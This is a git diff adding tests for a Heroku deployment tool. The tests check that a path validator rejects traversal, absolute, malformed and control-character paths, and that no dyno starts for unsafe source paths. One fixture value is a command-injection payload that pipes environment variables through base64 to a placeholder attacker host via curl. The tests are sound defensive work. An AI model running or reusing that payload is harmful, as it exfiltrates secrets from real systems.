@@ -3,18 +3,53 @@ import path from 'node:path';
 import os from 'node:os';
 import { expect } from 'chai';
 import { Readable } from 'node:stream';
-import { DeployToHeroku, DeploymentOptions } from './deploy-to-heroku.js';
+import {
+  DeploymentOptions,
+  DeployToHeroku,
+  isSafeSourceRelativePath,
+  MAX_SOURCE_RELATIVE_PATH_LENGTH,
+  OneOffDynoConfig,
+} from './deploy-to-heroku.js';
 import AppService from '../services/app-service.js';
 import SourceService from '../services/source-service.js';
 import AppSetupService from '../services/app-setup-service.js';
 import BuildService from '../services/build-service.js';
 import sinon from 'sinon';
 import * as Heroku from '@heroku-cli/schema';
-import { Build } from '@heroku-cli/schema';
-import { AppSetup } from '@heroku-cli/schema';
-import { OneOffDynoConfig } from './deploy-to-heroku.js';
+import { AppSetup, Build } from '@heroku-cli/schema';
 import { RendezvousConnection } from '../services/rendezvous.js';
 import DynoService from '../services/dyno-service.js';
+
+describe('isSafeSourceRelativePath', () => {
+  it('accepts typical virtual paths including optional ./ prefix', () => {
+    expect(isSafeSourceRelativePath('app.js')).to.be.true;
+    expect(isSafeSourceRelativePath('./app.json')).to.be.true;
+    expect(isSafeSourceRelativePath('src/index.js')).to.be.true;
+    expect(isSafeSourceRelativePath('.gitignore')).to.be.true;
+    expect(isSafeSourceRelativePath('package-lock.json')).to.be.true;
+    expect(isSafeSourceRelativePath('lib/nested/file.js')).to.be.true;
+  });
+
+  it('rejects traversal, absolute roots, and malformed slashes', () => {
+    expect(isSafeSourceRelativePath('..')).to.be.false;
+    expect(isSafeSourceRelativePath('../secret')).to.be.false;
+    expect(isSafeSourceRelativePath('foo/../bar')).to.be.false;
+    expect(isSafeSourceRelativePath('/etc/passwd')).to.be.false;
+    expect(isSafeSourceRelativePath('foo//bar')).to.be.false;
+    expect(isSafeSourceRelativePath('foo/')).to.be.false;
+    expect(isSafeSourceRelativePath('./')).to.be.false;
+    expect(isSafeSourceRelativePath('')).to.be.false;
+  });
+
+  it('rejects control characters, spaces, and overlong paths', () => {
+    expect(isSafeSourceRelativePath('a\nb')).to.be.false;
+    expect(isSafeSourceRelativePath('a\rb')).to.be.false;
+    expect(isSafeSourceRelativePath('a\0b')).to.be.false;
+    expect(isSafeSourceRelativePath('bad path')).to.be.false;
+    expect(isSafeSourceRelativePath('a'.repeat(MAX_SOURCE_RELATIVE_PATH_LENGTH + 1))).to.be.false;
+    expect(isSafeSourceRelativePath('a'.repeat(MAX_SOURCE_RELATIVE_PATH_LENGTH))).to.be.true;
+  });
+});
 
 describe('DeployToHeroku', () => {
   // Increase timeout for async tests
@@ -253,6 +288,167 @@ describe('DeployToHeroku', () => {
       expect(result).to.have.property('exitCode', 0);
       expect(dynoServiceStub.create.calledOnce).to.be.true;
       expect(rendezvousStub.calledOnce).to.be.true;
+    });
+
+    it('should not create a one-off dyno when a source relativePath contains shell metacharacters', async function () {
+      this.timeout(TEST_TIMEOUT);
+      await createTempFile(
+        'app.json',
+        JSON.stringify({
+          name: 'test-app',
+          description: 'Test app',
+          stack: 'heroku-22'
+        })
+      );
+
+      const mockDyno = {
+        id: 'dyno-id',
+        attach_url: 'https://test.com/attach',
+        command: 'echo done'
+      };
+      dynoServiceStub.create.resolves(mockDyno);
+      sinon.stub(RendezvousConnection.prototype, 'connect').resolves({ output: '', exitCode: 0 });
+
+      const options: OneOffDynoConfig = {
+        name: 'test-app',
+        command: 'echo done',
+        rootUri: tempDir,
+        // Bounty-style payload: would break out of `> path` if this string were executed as shell.
+        sources: [
+          {
+            relativePath: 'x; curl https://attacker.example.invalid/?d=$(env|base64) #',
+            contents: 'harmless'
+          }
+        ]
+      };
+
+      const result = await deployToHeroku.run(options);
+      expect(result).to.not.be.null;
+      expect(
+        dynoServiceStub.create.called,
+        'dynoService.create must not run when relativePath is not a safe virtual path'
+      ).to.be.false;
+      expect(result).to.have.property('errorMessage');
+      expect((result as { errorMessage: string }).errorMessage).to.match(/relativePath|Invalid source/i);
+    });
+
+    it('should not create a one-off dyno when a source relativePath uses parent directory segments', async function () {
+      this.timeout(TEST_TIMEOUT);
+      await createTempFile(
+        'app.json',
+        JSON.stringify({
+          name: 'test-app',
+          description: 'Test app',
+          stack: 'heroku-22'
+        })
+      );
+      dynoServiceStub.create.resolves({
+        id: 'dyno-id',
+        attach_url: 'https://test.com/attach',
+        command: 'echo done'
+      });
+      sinon.stub(RendezvousConnection.prototype, 'connect').resolves({ output: '', exitCode: 0 });
+
+      const result = await deployToHeroku.run({
+        name: 'test-app',
+        command: 'echo done',
+        rootUri: tempDir,
+        sources: [{ relativePath: 'foo/../bar.js', contents: 'x' }]
+      } as OneOffDynoConfig);
+
+      expect(dynoServiceStub.create.called).to.be.false;
+      expect(result).to.have.property('errorMessage');
+      expect((result as { errorMessage: string }).errorMessage).to.match(/relativePath|Invalid source/i);
+    });
+
+    it('should not create a one-off dyno when a source relativePath is absolute', async function () {
+      this.timeout(TEST_TIMEOUT);
+      await createTempFile(
+        'app.json',
+        JSON.stringify({
+          name: 'test-app',
+          description: 'Test app',
+          stack: 'heroku-22'
+        })
+      );
+      dynoServiceStub.create.resolves({
+        id: 'dyno-id',
+        attach_url: 'https://test.com/attach',
+        command: 'echo done'
+      });
+      sinon.stub(RendezvousConnection.prototype, 'connect').resolves({ output: '', exitCode: 0 });
+
+      const result = await deployToHeroku.run({
+        name: 'test-app',
+        command: 'echo done',
+        rootUri: tempDir,
+        sources: [{ relativePath: '/tmp/evil.js', contents: 'x' }]
+      } as OneOffDynoConfig);
+
+      expect(dynoServiceStub.create.called).to.be.false;
+      expect(result).to.have.property('errorMessage');
+      expect((result as { errorMessage: string }).errorMessage).to.match(/relativePath|Invalid source/i);
+    });
+
+    it('should not create a one-off dyno when a source relativePath has an empty segment', async function () {
+      this.timeout(TEST_TIMEOUT);
+      await createTempFile(
+        'app.json',
+        JSON.stringify({
+          name: 'test-app',
+          description: 'Test app',
+          stack: 'heroku-22'
+        })
+      );
+      dynoServiceStub.create.resolves({
+        id: 'dyno-id',
+        attach_url: 'https://test.com/attach',
+        command: 'echo done'
+      });
+      sinon.stub(RendezvousConnection.prototype, 'connect').resolves({ output: '', exitCode: 0 });
+
+      const result = await deployToHeroku.run({
+        name: 'test-app',
+        command: 'echo done',
+        rootUri: tempDir,
+        sources: [{ relativePath: 'src//index.js', contents: 'x' }]
+      } as OneOffDynoConfig);
+
+      expect(dynoServiceStub.create.called).to.be.false;
+      expect(result).to.have.property('errorMessage');
+      expect((result as { errorMessage: string }).errorMessage).to.match(/relativePath|Invalid source/i);
+    });
+
+    it('should create a one-off dyno when sources use only safe virtual paths', async function () {
+      this.timeout(TEST_TIMEOUT);
+      await createTempFile(
+        'app.json',
+        JSON.stringify({
+          name: 'test-app',
+          description: 'Test app',
+          stack: 'heroku-22'
+        })
+      );
+
+      const mockDyno = {
+        id: 'dyno-id',
+        attach_url: 'https://test.com/attach',
+        command: 'echo done'
+      };
+      dynoServiceStub.create.resolves(mockDyno);
+      sinon.stub(RendezvousConnection.prototype, 'connect').resolves({ output: 'ok', exitCode: 0 });
+
+      const options: OneOffDynoConfig = {
+        name: 'test-app',
+        command: 'echo done',
+        rootUri: tempDir,
+        sources: [{ relativePath: 'app.js', contents: 'console.log(1)' }]
+      };
+
+      const result = await deployToHeroku.run(options);
+      expect(result).to.not.be.null;
+      expect(dynoServiceStub.create.calledOnce).to.be.true;
+      expect(result).to.have.property('exitCode', 0);
     });
   });
 });
